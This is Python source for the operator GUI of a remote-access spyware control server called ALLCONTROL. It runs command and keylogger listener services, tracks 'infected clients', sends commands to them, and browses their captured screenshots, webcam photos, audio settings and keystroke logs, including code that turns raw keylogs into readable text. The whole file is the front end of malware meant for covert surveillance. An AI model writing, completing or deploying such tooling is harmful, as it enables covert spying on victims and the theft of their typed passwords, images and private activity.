import random

import PySide2
from PySide2 import QtGui
from PySide2.QtCore import QRect, QSize, Qt
from PySide2.QtGui import QPixmap, QFont, QTextCharFormat, QTextCursor

import gui
from gui import Ui_ALLCONTROL_SERVER
from PySide2.QtWidgets import QMainWindow, QMdiArea, QAction, QMdiSubWindow, QTextEdit, QApplication, QLabel, QWidget, \
    QVBoxLayout, QComboBox, QTableWidgetItem, QTableWidget, QPushButton, QHBoxLayout, QPlainTextEdit, QMenu, QSlider
import zipfile
import sys
import qdarktheme
import os
import ServerDatabase
import threading
import time
import socket
import datetime
import pickle
import pytz

logs = list(list(list()))


class guiMain(Ui_ALLCONTROL_SERVER):
    command_server_handle = None
    keylogger_server_handle = None
    connected_clients = []
    red_color = '#a31d16'
    green_color = 'green'
    database_handle = None
    airplaneMode = False
    imageCaptureData = []
    databaseImageData = []
    imageCaptureViewIndex = 0
    databaseImagePreviewIndex = 0
    databaseTableImageCount = 0
    databaseViewTableRow = 0
    fullscreenWindowHandle = None
    databaseViewFilters = []
    database_context_menu = None

    def __init__(self):
        super().__init__()
        self.database_handle = ServerDatabase.DataBase()
        self.database_handle.init_database()

    def load_backend(self):

        self.command_server_handle = CommandServer()
        self.command_server_handle.database_handle = ServerDatabase.DataBase()

        self.keylogger_server_handle = KeyloggerServer()
        self.keylogger_server_handle.database_handle = ServerDatabase.DataBase()

        configs = self.database_handle.get_server_config()
        if configs[0]:
            self.command_server_handle.command_server_enabled = True
        if configs[1]:
            self.keylogger_server_handle.keylogger_server_enabled = True

        if not self.database_handle.certificate_exists('COMMAND'):
            # self.command_server_handle.country = input('ENTER COUNTRY FOR CERTIFICATE [MIN 2 CHARACTERS]: ')
            self.command_server_handle.country = 'US'
            # self.command_server_handle.state = input('ENTER STATE FOR CERTIFICATE [MIN 2 CHARACTERS]: ')
            self.command_server_handle.state = 'CA'
            # self.command_server_handle.common_name = input('ENTER COMMON NAME FOR CERTIFICATE [MIN 2 CHARACTERS]: ')
            self.command_server_handle.common_name = 'ALLCONTROL'

        command_server_listener_thread = threading.Thread(target=self.command_server_handle.listen)
        command_server_listener_thread.start()

        ping_service_listener_thread = threading.Thread(target=self.command_server_handle.listen_command_server_ping_service)
        ping_service_listener_thread.start()

        check_online_thread = threading.Thread(
            target=self.command_server_handle.check_command_server_clients_online)  # Will ping each client to check who is offline.
        check_online_thread.start()



        keylogger_listener_thread = threading.Thread(target=self.keylogger_server_handle.start_keylogger_listener)
        keylogger_listener_thread.start()

        keylogger_ping_thread = threading.Thread(target=self.keylogger_server_handle.listen_keylogger_server_ping_service)
        keylogger_ping_thread.start()

        keylogger_check_online_thread = threading.Thread(target=self.keylogger_server_handle.check_keylogger_clients_online)
        keylogger_check_online_thread.start()

    def load_frontend(self):
        self.load_dashboard() # Doesn't stall because functions in load_dashboard are called in new threads.
        self.load_operations() # Doesn't stall because functions in load_operations are called in new threads.
        self.load_configurations()
        self.load_database()

        logs_thread = threading.Thread(target=self.show_dashboard_logs)
        logs_thread.start()

    def load_dashboard(self):
        # Monitors status of servers
        self.airplaneModeButton.clicked.connect(self.toggleAirplaneMode)
        info_thread = threading.Thread(target=self.monitor_info)
        info_thread.start()

        command_connections_thread = threading.Thread(target=self.monitor_command_connections)
        command_connections_thread.start()

        keylogger_connections_thread = threading.Thread(target=self.monitor_keylogger_connections)
        keylogger_connections_thread.start()

        infected_clients_thread = threading.Thread(target=self.load_infected_clients)
        infected_clients_thread.start()
        self.connectedClientsKeyloggerServer.setHorizontalHeaderLabels(['client_id', 'client_address', 'sID'])

    def toggleAirplaneMode(self):
        # Disables the ping server for both command and keylogger and closes out the command and keylogger sever
        # Should show prompt that states the purpose of this mode.
        self.airplaneMode = not self.airplaneMode

        if self.airplaneMode:
            self.airplaneModeButton.setStyleSheet(f'background:{self.green_color};')
            self.disableCommandServer()
            self.disableKeyloggerServer()
            self.airplaneMode = True
        else:
            self.airplaneModeButton.setStyleSheet(f'')
            self.enableCommandServer()
            self.enableKeyloggerServer()
            self.airplaneMode = False

    def onSendButtonClicked(self):
        sendCommandThread = threading.Thread(target=self.sendCommand)
        sendCommandThread.start()

    def onApplyFilterButtonClicked(self):
        applyFilterThread = threading.Thread(target=self.applyFilter)
        applyFilterThread.start()

    def load_operations(self):

        self.sendCommandButton.clicked.connect(self.onSendButtonClicked)
        self.applyButton.clicked.connect(self.onApplyFilterButtonClicked)
        self.nextMediaImageButton.clicked.connect(self.nextMediaButtonClicked)
        self.previousMediaImageButton.clicked.connect(self.previousMediaButtonClicked)
        self.sendToAllCheckBox.toggled.connect(self.sendToAllCheckBoxMethod)
        self.fullscreenImageButton.clicked.connect(self.commandFullScreenButtonClicked)
        self.command_server_handle.commands = self.database_handle.get_commands_name()
        self.commandNameComboBox.currentIndexChanged.connect(self.loadCommandParameters)

        load_commands_thread = threading.Thread(target=self.load_commands)
        load_commands_thread.start()


    def nextMediaButtonClicked(self):

        if len(self.imageCaptureData) == 1:
            return
        if self.imageCaptureViewIndex == len(self.imageCaptureData) - 1: # If the current index is the last one it should wrap around
            self.imageCaptureViewIndex = 0
        else:
            self.imageCaptureViewIndex += 1

        self.addCommandPreviewImage()

    def previousMediaButtonClicked(self):
        if len(self.imageCaptureData) == 1:
            return
        if self.imageCaptureViewIndex == 0: # If the current index is the last one it should wrap around
            self.imageCaptureViewIndex = len(self.imageCaptureData) - 1
        else:
            self.imageCaptureViewIndex -= 1
        self.addCommandPreviewImage()

    def load_configurations(self):
        self.infectedClientsConfigViewTable.itemSelectionChanged.connect(self.clientConfigSelected)
        self.updateConfigButton.clicked.connect(self.updateClientConfig)
        self.undoConfigChangeButton.clicked.connect(self.undoClientConfigChanges)

        threading.Thread(target=self.animateBanner).start()
        self.commandServerCheckBox.clicked.connect(self.toggleCommandServer)
        self.keyloggerServerCheckBox.clicked.connect(self.toggleKeyloggerServer)

        monitor_server_config_thread = threading.Thread(target=self.monitorServerConfigs)
        monitor_server_config_thread.start()

    def databaseImageFullscreenButtonClicked(self):
        table = self.tableDatabaseCombobox.currentText()
        if table != 'screenshots' and table != 'webcam_pics':
            return

        if self.databaseTableImageCount == 0:
            return
        self.fullscreenWindowHandle = gui.fullScreenImageWindow()
        # Get from the self.imagePreviewLabel
        date_captured = self.databaseViewTable.item(self.databaseImagePreviewIndex,
                                                    2).text()  # Gets the date captured which should be unique

        image = self.database_handle.getBlobData(self.tableDatabaseCombobox.currentText(), 'image',
                                                 date_captured)
        pixmap = QPixmap()
        pixmap.loadFromData(image)
        pixmap = pixmap.scaled(self.fullscreenWindowHandle.window_width, self.fullscreenWindowHandle.window_height)
        self.fullscreenWindowHandle.fullscreenImageLabel.setPixmap(pixmap)
        self.fullscreenWindowHandle.new_window.show()

    def load_database(self):
        self.databaseViewTable.itemSelectionChanged.connect(self.databaseTableSelectionChanged)  # When cell is connected it checks if an image value is highlighed
        self.refreshTableViewButton.clicked.connect(self.populateDatabaseViewTable)
        self.nextDatabaseImageButton.clicked.connect(self.nextDatabaseImageClicked)
        self.previousDatabaseImageButton.clicked.connect(self.previousDatabaseImageClicked)
        self.fullscreenDatabaseButton.clicked.connect(self.databaseImageFullscreenButtonClicked)
        self.databaseViewFilterApplyButton.clicked.connect(self.populateDatabaseViewTable)
        self.databaseViewFilterResetButton.clicked.connect(self.resetDatabaseViewFilters)
        self.deleteDatabaseRowButton.clicked.connect(self.deleteDatabaseRow)
        # Get all table names from server_database
        databaseTables = self.database_handle.getDatabaseTables()
        # Store them in combobox

        self.tableDatabaseCombobox.addItems(databaseTables)

        # When combobox value changes that means a table was selected
        # The QTable should then populate with a view
        self.tableDatabaseCombobox.currentIndexChanged.connect(self.tableSelectionChanged)

        self.createDatabaseContextMenu()

    def deleteDatabaseRow(self):
        # Get row currently selected and delete from database
        # Display the new table with deleted row
        # Get row index
        row = self.databaseViewTable.currentRow()
        # Gets number of columns
        columns = self.databaseViewTable.columnCount()
        # Array will hold the values to search for in the DB when making the delete statement
        condition_values = []
        for column in range(columns):
            values = self.databaseViewTable.item(row, column)
            if values.text() != 'LARGE DATA VALUE':
                condition_values.append(values.text())

        # Deletes from specified table with the specified values
        self.database_handle.deleteRow(self.tableDatabaseCombobox.currentText(), condition_values)
        print(f'condition_values = {condition_values}')

    def createDatabaseContextMenu(self):
        # Create a context menu for the table
       # self.database_context_menu = QMenu(self)
        #copy_action = QAction("Copy", self)
        #copy_action.triggered.connect(self.copySelectedItems)
        #self.database_context_menu.addAction(copy_action)

        # Connect the context menu to the table
        self.databaseViewTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.databaseViewTable.customContextMenuRequested.connect(self.showContextMenu)

        self.infoTable.setContextMenuPolicy(Qt.CustomContextMenu)
        self.infoTable.customContextMenuRequested.connect(self.showContextMenu)


    def copySelectedItems(self):
        clipboard = QApplication.clipboard()
        sender = self.sender()  # Get the table that initiated the copy action
        selectedItems = sender.selectedItems()
        data = "\t".join(item.text() for item in selectedItems)
        clipboard.setText(data)

    def showContextMenu(self, pos):
        sender = self.sender()  # Get the table that triggered the context menu
        # Create a context menu
        contextMenu = QMenu(self)

        # Add a "Copy" action to the context menu
        copyAction = QAction("Copy", self)
        copyAction.triggered.connect(self.copySelectedItems)
        contextMenu.addAction(copyAction)

        contextMenu.exec_(self.mapToGlobal(pos))

    def databaseTableSelectionChanged(self):
        self.checkIfSelectedItemIsImage()
        self.checkIfSelectionIsKeylogData()

    def tableSelectionChanged(self):
        table_name = self.tableDatabaseCombobox.currentText()
        if table_name == 'keylog_data':
            self.databaseViewTable.setCurrentCell(0, 1)

        self.removeDatabaseFilterWidget()
        self.insertDatabaseTableFilters()
        self.populateDatabaseViewTable()

    def resetDatabaseViewFilters(self):
        self.removeDatabaseFilterWidget()
        self.populateDatabaseViewTable()
        self.insertDatabaseTableFilters()

    def nextDatabaseImageClicked(self):
        if self.tableDatabaseCombobox.currentText() == 'screenshots' or self.tableDatabaseCombobox.currentText() == 'webcam_pics' :
            self.databaseViewTableRow = self.databaseViewTable.selectedItems()
            if self.databaseViewTableRow:

                self.databaseViewTableRow = self.databaseViewTableRow[0].row()
                if self.databaseViewTableRow + 1 == self.databaseTableImageCount:
                    # If we're currently looking at the last image and next is clicked, loop around
                    self.databaseViewTableRow = 0
                else:
                    self.databaseViewTableRow = self.databaseViewTableRow + 1
            else:
                return



            if self.databaseViewTable.item(self.databaseViewTableRow, 1).text() == 'LARGE DATA VALUE':
                nextImageDateCaptured = self.databaseViewTable.item(self.databaseViewTableRow, 2).text()
                self.addDatabaseImageToPane(nextImageDateCaptured)
                self.databaseViewTable.setCurrentCell(self.databaseViewTableRow, 1)

        if self.tableDatabaseCombobox.currentText() == 'keylog_data':
            # Get the current date in the date_captured box.
            current_date = self.databaseViewTable.item(self.databaseViewTable.currentRow(), 2).text().split()[0]
            current_client_id = self.databaseViewTable.item(self.databaseViewTable.currentRow(), 0).text()  # Assuming this is how you get the currently selected client ID
            next_greatest_date = None

            for row in range(self.databaseViewTable.rowCount()):
                date_item = self.databaseViewTable.item(row, 2)  # Assuming date_info is in column index 2
                client_id_item = self.databaseViewTable.item(row, 0)  # Assuming client_id is in column index 0
                if date_item and client_id_item:
                    date_info = date_item.text().split()[0]  # Extract the date part
                    client_id = client_id_item.text()  # Extract the client ID

                    if client_id == current_client_id and date_info > current_date and (
                            next_greatest_date is None or date_info < next_greatest_date):
                        next_greatest_date = date_info
                        self.databaseViewTable.setCurrentCell(row, 2)

            self.loadDatabasePreviewKeylogData()

    def previousDatabaseImageClicked(self):
        if self.tableDatabaseCombobox.currentText() == 'screenshots' or self.tableDatabaseCombobox.currentText() == 'webcam_pics' :
            selectedItems = self.databaseViewTable.selectedItems()
            if selectedItems:
                self.databaseViewTableRow = selectedItems[0].row()

                #self.databaseViewTableRow = self.databaseViewTableRow[0].row()

                if self.databaseViewTableRow == 0:
                    # If we're currently looking at the first image and previous button is clicked, loop around to end
                    self.databaseViewTableRow = self.databaseTableImageCount - 1
                else:
                    self.databaseViewTableRow = self.databaseViewTableRow - 1
            else:
                return

            if self.databaseViewTable.item(self.databaseViewTableRow, 1).text() == 'LARGE DATA VALUE':
                nextImageDateCaptured = self.databaseViewTable.item(self.databaseViewTableRow, 2).text()

                self.addDatabaseImageToPane(nextImageDateCaptured)
                self.databaseViewTable.setCurrentCell(self.databaseViewTableRow, 1)

        if self.tableDatabaseCombobox.currentText() == 'keylog_data':
            # Get the current date in the date_captured box.
            current_date = self.databaseViewTable.item(self.databaseViewTable.currentRow(), 2).text().split()[0]
            current_client_id = self.databaseViewTable.item(self.databaseViewTable.currentRow(), 0).text()  # Assuming this is how you get the currently selected client ID
            next_least_date = None

            for row in range(self.databaseViewTable.rowCount()):
                date_item = self.databaseViewTable.item(row, 2)  # Assuming date_info is in column index 2
                client_id_item = self.databaseViewTable.item(row, 0)  # Assuming client_id is in column index 0
                if date_item and client_id_item:
                    date_info = date_item.text().split()[0]  # Extract the date part
                    client_id = client_id_item.text()  # Extract the client ID

                    if client_id == current_client_id and date_info < current_date and (
                            next_least_date is None or date_info > next_least_date):
                        next_least_date = date_info
                        self.databaseViewTable.setCurrentCell(row, 2)

            self.loadDatabasePreviewKeylogData()

    def getDatabaseFilterData(self):
        # Should get column, condition and key-values from DB filter widgets
        filters = {}
        for widget in self.databaseFilterWidgetsScrollContent.children():
            if type(widget) != PySide2.QtWidgets.QVBoxLayout:
                temp_filter = {}
                for element in widget.children():
                    if type(element) == PySide2.QtWidgets.QHBoxLayout:
                        columnNameItem = element.itemAt(0) # Gets the text fro button which is the column name
                        columnNameWidget = columnNameItem.widget()
                        columnName = columnNameWidget.text()

                        # Checks if button is checked
                        # If it is it should add the, condition, and value as a lsit to a dictionary with keys of the column name

                        if columnNameWidget.isChecked():
                            filters[columnName] = []
                            for index in range(1, element.count()):
                                widg = element.itemAt(index)
                                widg = widg.widget()
                                if type(widg) == PySide2.QtWidgets.QComboBox:
                                    filters[columnName].append(widg.currentText())
                                elif type(widg) == PySide2.QtWidgets.QPlainTextEdit:
                                    filters[columnName].append(widg.toPlainText())
        return filters

    def populateDatabaseViewTable(self):
        # Currently gets data from database
        # Needs to accept a filter dictionary with column and values to filter by
        self.keylogPreviewTBrowser.setVisible(False)

        table_name = self.tableDatabaseCombobox.currentText()
        if table_name == '':
            return
        else:
            columns = self.database_handle.getTableColumns(table_name)
            filter = self.getDatabaseFilterData()
            values = self.database_handle.getTableData(table_name, filter=filter)
            self.insertTableToView(columns, values)

        if table_name == 'screenshots' or table_name == 'webcam_pics':
            # Get the number of images available in DB so the buttons can loop around
            self.databaseTableImageCount = self.database_handle.getTableImageTotal(table_name)
            item = self.databaseViewTable.item(0, 1)
            if item:
                self.checkIfSelectedItemIsImage()
                self.databaseViewTable.setCurrentItem(item)
        elif table_name == 'keylog_data':
            self.keylogPreviewTBrowser.setVisible(True)
            self.loadDatabasePreviewKeylogData()

        row_count = self.databaseViewTable.rowCount()
        self.rowCountBrowser.setText(str(row_count))

    def loadDatabasePreviewKeylogData(self):
        # Gets text from the currently selected cell and inserts it into the text browser
        # Should capture data for the day
        # That means it should select all keylog data for the day for the same client id.
        selectedItems = self.databaseViewTable.selectedItems()
        if selectedItems:
            self.databaseViewTableRow = selectedItems[0].row()
        else:
            return

        keylogIText = self.databaseViewTable.item(self.databaseViewTableRow, 1)
        client_id = self.databaseViewTable.item(self.databaseViewTableRow, 0).text()
        date_captured = self.databaseViewTable.item(self.databaseViewTableRow, 2).text()
        date_captured = datetime.datetime.strptime(date_captured, '%Y-%m-%d %H:%M:%S.%f')

        # Extract the day, month, and year from the date_captured
        day = date_captured.strftime('%d')  # Format with leading zero
        month = date_captured.strftime('%m')  # Format with leading zero
        year = date_captured.strftime('%Y')

        dayKeylogData = self.database_handle.getKeylogData(client_id, date_captured, day, month, year)
        self.keylogPreviewTBrowser.setText('')
        self.databaseImageCaptureDateEdit.setText(f'{year}-{month}-{day}')

        # Needs to place the hour on a line in bold and underlined 14 font and a line space before hourly keylog data
        # The hours keylog data will go under

        self.addHourlyKeylogData(dayKeylogData)
        self.insert_header(date_captured)

        self.databaseViewTable.setCurrentItem(keylogIText)
        #self.databaseViewTable.setCurrentCell(0, 1)

    def addHourlyKeylogData(self, dayKeylogData):
        # Create a QTextCursor to manipulate the text content


        text_cursor = QTextCursor(self.keylogPreviewTBrowser.document())

        for hour, text in dayKeylogData.items():
            # Create HTML for the hour key (center-aligned)
            font_css = "font-size: 14pt; font-weight: bold; font-family: Seqoe UI Black;"

            hour_html = f"""
                <p align="left" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">
                <span style=" font-size:14pt;">{hour}</span></p>
            """

            text_cursor.insertHtml(hour_html)
            text_cursor.insertBlock()
            text_cursor.insertBlock()

            text = self.reformatKeylogText(text)
            text_html = f"""
                <p align="left" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">
                <span style=" font-weight:400;">{text}</span></p>
            """
            text_cursor.insertHtml(text_html)
            text_cursor.insertBlock()
            text_cursor.insertBlock()
            # Create HTML for the text (left-aligned)

    def reformatKeylogText(self, text):
        # Should backspace for [backspace]
        # Should remove shift, right, left, up, down, alt
        reformatted_text = text
        keys_to_format = ['delete', 'caps lock', 'ctrl', 'alt', 'shift', 'right shift', 'right ctrl', 'esc',
                          'insert', 'home', 'end', 'page up', 'page down', 'up', 'down',
                          'left', 'right', 'menu', 'print screen', 'pause', 'f1', 'f2', 'f3', 'f4',
                          'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12', 'num lock', 'right alt', 'left windows', 'scroll lock']

        for key in keys_to_format:
            key = f'[{key}]'
            if key in reformatted_text:
                reformatted_text = reformatted_text.replace(key, '')


        # Remove also the character using delete which removes the character in fron of the cursor
        while reformatted_text.find('[backspace]') != -1:
            index = reformatted_text.find('[backspace]') - 1
            reformatted_text = remove_characters_at_index(reformatted_text, index, 1)
            reformatted_text = remove_first_occurrence(reformatted_text, '[backspace]')
        #reformatted_text = reformatted_text.replace('[backspace]', '')
        #reformatted_text = reformatted_text.replace('[backspace]', '')

        return reformatted_text

    def insert_header(self, date_captured):

        # Create a QTextCursor to manipulate the text content
        cursor = QTextCursor(self.keylogPreviewTBrowser.document())
        cursor.insertBlock()  # Add a new line after the header

        # Convert the datetime object to a formatted date string (excluding time)
        date_str = date_captured.strftime('%Y-%m-%d')
        font_css = "font-size: 16pt; font-weight: bold; font-family: Seqoe UI Black;"

        # Insert HTML text with center alignment and font properties
        header_html = f"<div align='center'><span style='{font_css}'>{date_str}</span></div>"
        cursor.insertHtml(header_html)

        # Insert the formatted date with the specified styling
        #cursor.insertText(date_str, header_format)

        # Insert a line separator
        cursor.insertBlock()  # Add a new line after the header
        cursor.insertBlock()  # Add a new line after the header

    def checkIfSelectionIsKeylogData(self):
        table_name = self.tableDatabaseCombobox.currentText()
        if table_name != 'keylog_data':
            return
        columnOfSelection = self.databaseViewTable.selectedItems()
        if columnOfSelection:
            columnOfSelection = columnOfSelection[0].column()
        else:
            return
        columnOfSelection = self.databaseViewTable.horizontalHeaderItem(columnOfSelection).text()
        if columnOfSelection != 'log_data':
            return
        else:
            self.loadDatabasePreviewKeylogData()

    def addFilterWidget(self, column_name):
        #self.testFilterWidget = QWidget(self.verticalLayoutWidget_10)
        font = QFont()
        font.setFamily(u"Segoe UI Black")
        font.setPointSize(16)
        font.setBold(True)
        font.setWeight(75)

        FilterWidget = QWidget(self.databaseFilterWidgetsScrollContent)

        FilterWidget.setObjectName(f"{column_name}_widget")

        FilterWidgetHLayout = QHBoxLayout(FilterWidget)
        FilterWidgetHLayout.setGeometry(QRect(-1, -1, 601, 61))
        FilterWidgetHLayout.setSpacing(6)
        FilterWidgetHLayout.setObjectName(f"{column_name}FilterWidgetHLayout")
        FilterWidgetHLayout.setContentsMargins(7, 0, 10, 0)

        databaseFilterKey = QPushButton(FilterWidget)
        databaseFilterKey.setObjectName(f"{column_name}databaseFilterKey")
        databaseFilterKey.setFont(font)
        databaseFilterKey.setIconSize(QSize(16, 16))
        databaseFilterKey.setCheckable(True)
        databaseFilterKey.setAutoDefault(False)
        databaseFilterKey.setFlat(False)
        databaseFilterKey.setText(column_name)

        FilterWidgetHLayout.addWidget(databaseFilterKey)

        databaseFilterCondition = QComboBox(FilterWidget)
        databaseFilterCondition.setFont(font)

        databaseFilterCondition.addItem("is equal to")
        databaseFilterCondition.addItem("is not equal to")
        databaseFilterCondition.addItem("contains")
        databaseFilterCondition.addItem("is in")
        databaseFilterCondition.addItem("is greater than")
        databaseFilterCondition.addItem("is less than")

        databaseFilterCondition.setObjectName(f"{column_name}databaseFilterCondition")
        databaseFilterCondition.setFixedWidth(160)
        FilterWidgetHLayout.addWidget(databaseFilterCondition)

        databaseFilterValue = QPlainTextEdit(FilterWidget)
        databaseFilterValue.setObjectName(f"{column_name}databaseFilterValue")
        databaseFilterValue.setFont(font)
        databaseFilterValue.setFixedHeight(38)

        FilterWidgetHLayout.addWidget(databaseFilterValue)

        self.databaseFilterContentVLayout.addWidget(FilterWidget)

    def createWidget(self, command_parameter):
        if command_parameter[1] == 'Screenshot Quantity':
            # Create Widgets
            #Screenshot Quantity Widget:
            parameterWidget = QWidget(self.commandParametersScrollContent)

            parameterWidget.setObjectName(f"{command_parameter[1]}_widget")

            parameterWidgetHLayout = QHBoxLayout(parameterWidget)
            parameterWidgetHLayout.setGeometry(QRect(-1, -1, 601, 61))
            parameterWidgetHLayout.setSpacing(6)
            parameterWidgetHLayout.setObjectName(f"{command_parameter[1]}commandParameterWidgetHLayout")
            parameterWidgetHLayout.setContentsMargins(7, 0, 10, 0)

            screenshotQuantityNameLabel = QLabel(f'{command_parameter[1]}:')
            screenshotQuantityNameLabel.setFont(self.font)  # Parameter name

            parameterWidgetHLayout.addWidget(screenshotQuantityNameLabel)


            screenshotQuantitySlider = QSlider()  # Slider
            screenshotQuantitySlider.setOrientation(Qt.Horizontal)

            parameterWidgetHLayout.addWidget(screenshotQuantitySlider)


            value_label = QLabel('1', self)
            value_label.setFont(self.font) # Shows slider value for user
            screenshotQuantitySlider.valueChanged.connect(lambda : self.updateLabel('Screenshot Quantity', value_label, screenshotQuantitySlider.value()))
            screenshotQuantitySlider.setMinimum(1)
            screenshotQuantitySlider.setMaximum(25)
            screenshotQuantitySlider.setFont(self.font)

            parameterWidgetHLayout.addWidget(value_label)

            # Add widget to dictionary
            self.commandParametersContentVLayout.addWidget(parameterWidget)

        elif command_parameter[1] == 'Screenshot Time Interval':
            # Time interval Widget:
            parameterWidget = QWidget(self.commandParametersScrollContent)
            parameterWidget.setObjectName(f"{command_parameter[1]}_widget")

            parameterWidgetHLayout = QHBoxLayout(parameterWidget)
            parameterWidgetHLayout.setGeometry(QRect(-1, -1, 601, 61))
            parameterWidgetHLayout.setSpacing(6)
            parameterWidgetHLayout.setObjectName(f"{command_parameter[1]}commandParameterWidgetHLayout")
            parameterWidgetHLayout.setContentsMargins(7, 0, 10, 0)

            timeIntervalNameLabel = QLabel(f'{command_parameter[1]}:')
            timeIntervalNameLabel.setFont(self.font)  # Parameter name
            parameterWidgetHLayout.addWidget(timeIntervalNameLabel)


            timeIntervalSlider = QSlider()  # Slider
            timeIntervalSlider.setOrientation(Qt.Horizontal)
            parameterWidgetHLayout.addWidget(timeIntervalSlider)


            timeIntervalValueLabel = QLabel('1 Second', self)
            timeIntervalValueLabel.setFont(self.font) # Shows slider value for user
            parameterWidgetHLayout.addWidget(timeIntervalValueLabel)

            timeIntervalSlider.valueChanged.connect(lambda : self.updateLabel('Screenshot Time Interval', timeIntervalValueLabel, f'{timeIntervalSlider.value()} Seconds'))
            timeIntervalSlider.setMinimum(1)
            timeIntervalSlider.setMaximum(30)
            timeIntervalSlider.setFont(self.font)

            # Add widget to dictionary
            self.commandParametersContentVLayout.addWidget(parameterWidget)

        elif command_parameter[1] == 'Webcam Time Interval':

            # Time interval Widget:
            parameterWidget = QWidget(self.commandParametersScrollContent)
            parameterWidget.setObjectName(f"{command_parameter[1]}_widget")

            parameterWidgetHLayout = QHBoxLayout(parameterWidget)
            parameterWidgetHLayout.setGeometry(QRect(-1, -1, 601, 61))
            parameterWidgetHLayout.setSpacing(6)
            parameterWidgetHLayout.setObjectName(f"{command_parameter[1]}commandParameterWidgetHLayout")
            parameterWidgetHLayout.setContentsMargins(7, 0, 10, 0)

            # Time interval Widget:
            timeIntervalNameLabel = QLabel(f'{command_parameter[1]}:')
            timeIntervalNameLabel.setFont(self.font)  # Parameter name
            parameterWidgetHLayout.addWidget(timeIntervalNameLabel)


            timeIntervalSlider = QSlider()  # Slider
            timeIntervalSlider.setOrientation(Qt.Horizontal)
            parameterWidgetHLayout.addWidget(timeIntervalSlider)

            timeIntervalValueLabel = QLabel('1', self)
            parameterWidgetHLayout.addWidget(timeIntervalValueLabel)

            timeIntervalValueLabel.setFont(self.font) # Shows slider value for user
            timeIntervalSlider.valueChanged.connect(lambda : self.updateLabel('Webcam Time Interval', timeIntervalValueLabel, timeIntervalSlider.value()))
            timeIntervalSlider.setMinimum(1)
            timeIntervalSlider.setMaximum(30)
            timeIntervalSlider.setFont(self.font)

            # Add widget to dictionary
            self.commandParametersContentVLayout.addWidget(parameterWidget)

        elif command_parameter[1] == 'Photo Quantity':
            # Time interval Widget:
            parameterWidget = QWidget(self.commandParametersScrollContent)
            parameterWidget.setObjectName(f"{command_parameter[1]}_widget")

            parameterWidgetHLayout = QHBoxLayout(parameterWidget)
            parameterWidgetHLayout.setGeometry(QRect(-1, -1, 601, 61))
            parameterWidgetHLayout.setSpacing(6)
            parameterWidgetHLayout.setObjectName(f"{command_parameter[1]}commandParameterWidgetHLayout")
            parameterWidgetHLayout.setContentsMargins(7, 0, 10, 0)

            photoQuantityNameLabel = QLabel(f'{command_parameter[1]}:')
            photoQuantityNameLabel.setFont(self.font)
            parameterWidgetHLayout.addWidget(photoQuantityNameLabel)

            photoQuantitySlider = QSlider()
            photoQuantitySlider.setOrientation(Qt.Horizontal)
            parameterWidgetHLayout.addWidget(photoQuantitySlider)

            value_label = QLabel('1', self)
            value_label.setFont(self.font)
            parameterWidgetHLayout.addWidget(value_label)

            photoQuantitySlider.valueChanged.connect(lambda : self.updateLabel('Photo Quantity', value_label, photoQuantitySlider.value()))
            photoQuantitySlider.setMinimum(1)
            photoQuantitySlider.setMaximum(25)
            photoQuantitySlider.setFont(self.font)

            photoQuantitySlider.setFixedSize(231, 36)

            self.commandParametersContentVLayout.addWidget(parameterWidget)
            # The key is the widget name and the value is the widget

        elif command_parameter[1] == 'Audio Duration':

            # Time interval Widget:
            parameterWidget = QWidget(self.commandParametersScrollContent)
            parameterWidget.setObjectName(f"{command_parameter[1]}_widget")

            parameterWidgetHLayout = QHBoxLayout(parameterWidget)
            parameterWidgetHLayout.setGeometry(QRect(-1, -1, 601, 61))
            parameterWidgetHLayout.setSpacing(6)
            parameterWidgetHLayout.setObjectName(f"{command_parameter[1]}commandParameterWidgetHLayout")
            parameterWidgetHLayout.setContentsMargins(7, 0, 10, 0)

            audioDurationNameLabel = QLabel(f'{command_parameter[1]}:')
            audioDurationNameLabel.setFont(self.font)
            parameterWidgetHLayout.addWidget(audioDurationNameLabel)

            audioDurationSlider = QSlider()
            audioDurationSlider.setOrientation(Qt.Horizontal)
            parameterWidgetHLayout.addWidget(audioDurationSlider)

            value_label = QLabel('1', self)
            value_label.setFont(self.font)
            parameterWidgetHLayout.addWidget(value_label)

            audioDurationSlider.valueChanged.connect(lambda : self.updateLabel('Audio Duration', value_label, f'{audioDurationSlider.value()} seconds'))
            audioDurationSlider.setMinimum(1)
            audioDurationSlider.setMaximum(600)
            audioDurationSlider.setFont(self.font)

            self.commandParametersContentVLayout.addWidget(parameterWidget)

    def loadCommandParameters(self):
        # To Do
        # Get all command parameters from command name in combobox.
        # Should get command parameter name, and widget type.
        # Create form from the command paramters
        # Add created widgets to the member list self.commandParametersForm


        command_parameters = self.databaseHandle.get_command_parameter(self.commandNameComboBox.currentText())
        if self.commandParametersForm is not None:
            # Clear current Widgets and forms.
            self.removeCommandParameterWidget()

        print(f'command parameters - {command_parameters}')
        if command_parameters is not None:
            for command in command_parameters:
                self.createWidget(command)

    def removeCommandParameterWidget(self):
        for widget in self.commandParametersScrollContent.findChildren(QWidget):
            if widget.objectName() != 'commandParametersContentVLayout':
                # self.databaseFilterWidgetsScrollContent.removeWidget(widget)
                widget.deleteLater()
                del widget

    def removeDatabaseFilterWidget(self):
        for widget in self.databaseFilterWidgetsScrollContent.findChildren(QWidget):
            if widget.objectName() != 'databaseFilterContentVLayout':
                #self.databaseFilterWidgetsScrollContent.removeWidget(widget)
                widget.deleteLater()
                del widget

    def insertDatabaseTableFilters(self):
        # Create a label, place it in databaseFilters[]
        # Append it to the
        table_name = self.tableDatabaseCombobox.currentText()
        if table_name == '':
            return
        columns = self.database_handle.getTableColumns(table_name)

        for column in columns:
            self.addFilterWidget(column)

    def checkIfSelectedItemIsImage(self):
        table_name = self.tableDatabaseCombobox.currentText()
        if table_name != 'screenshots' and table_name != 'webcam_pics':
            return

        selected_items = self.databaseViewTable.selectedItems()
        if selected_items:
            selected_item = selected_items[0]
            if selected_item.text() == 'LARGE DATA VALUE':  # Image data was selected and image should be drawn
                row = selected_item.row()
                self.databaseImagePreviewIndex = row
                column = selected_item.column()
                column_name = self.databaseViewTable.horizontalHeaderItem(column).text()
                if column_name != 'image':
                    return
                date_captured = self.databaseViewTable.item(row,
                                                            2).text()  # Gets the date captured which should be unique

                threading.Thread(target=self.addDatabaseImageToPane, args=(date_captured,)).start()
                self.databaseImageCaptureDateEdit.setText(date_captured)

